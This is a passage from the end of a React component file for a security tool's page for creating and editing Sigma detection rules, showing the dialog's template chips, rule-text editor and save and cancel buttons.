                      fontSize: '0.75rem',
                      whiteSpace: 'nowrap',
                      borderColor: 'hsl(var(--border))',
                      color: 'hsl(var(--primary))',
                      '&:hover': { borderColor: 'hsl(var(--primary))', bgcolor: 'hsl(var(--primary) / 0.08)' },
                    }}
                  >
                    {isGenerating ? 'Improving…' : 'Improve'}
                  </Button>
                </Box>
              ) : (
                <Box sx={{ display: 'flex', gap: 0.75, flexWrap: 'wrap' }}>
                  <Typography variant="caption" sx={{ color: 'hsl(var(--muted-foreground))', mr: 0.5, lineHeight: '24px' }}>
                    Templates:
                  </Typography>
                  {EXAMPLE_RULES.map((ex) => (
                    <Chip
                      key={ex.label}
                      label={ex.label}
                      size="small"
                      onClick={() => {
                        setRuleContent(ex.content);
                      }}
                      sx={{
                        height: 24,
                        fontSize: '0.7rem',
                        cursor: 'pointer',
                        backgroundColor: 'hsl(var(--muted))',
                        color: 'hsl(var(--muted-foreground))',
                        border: '1px solid hsl(var(--border))',
                        '&:hover': { backgroundColor: 'hsl(var(--muted) / 0.8)', borderColor: 'hsl(var(--muted-foreground) / 0.3)' },
                      }}
                    />
                  ))}
                </Box>
              )}
            </Box>
            <TextField
              multiline
              rows={20}
              value={ruleContent}
              onChange={(e) => setRuleContent(e.target.value)}
              fullWidth
              placeholder="Enter Sigma rule YAML..."
              sx={{
                '& .MuiOutlinedInput-root': {
                  backgroundColor: 'hsl(var(--muted))',
                  fontFamily: 'monospace',
                  fontSize: '0.875rem',
                  '& fieldset': {
                    borderColor: justGenerated ? 'hsl(142 76% 36% / 0.5)' : 'hsl(var(--border))',
                    transition: 'border-color 0.5s ease',
                  },
                  '&:hover fieldset': {
                    borderColor: 'hsl(var(--border))',
                  },
                  '&.Mui-focused fieldset': {
                    borderColor: 'hsl(var(--primary))',
                  },
                },
                '& .MuiOutlinedInput-input': {
                  color: 'hsl(var(--foreground))',
                },
              }}
            />
          </Box>
        </DialogContent>
        <DialogActions sx={{ borderTop: '1px solid hsl(var(--border))', px: 3, py: 2, gap: 1 }}>
          <Button
            onClick={() => setIsCreateDialogOpen(false)}
            sx={{ color: 'hsl(var(--muted-foreground))' }}
          >
            Cancel
          </Button>
          <Button
            variant="contained"
            onClick={handleSaveRule}
            disabled={isSaving || !ruleContent.trim() || !extractRuleName(ruleContent)}
            startIcon={isSaving ? <CircularProgress size={16} color="inherit" /> : null}
            sx={{
              backgroundColor: 'hsl(var(--primary))',
              '&:hover': {
                backgroundColor: 'hsl(var(--primary) / 0.9)',
              },
            }}
          >
            {editingFile ? 'Update Rule' : 'Create Rule'}
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default RulesPage;
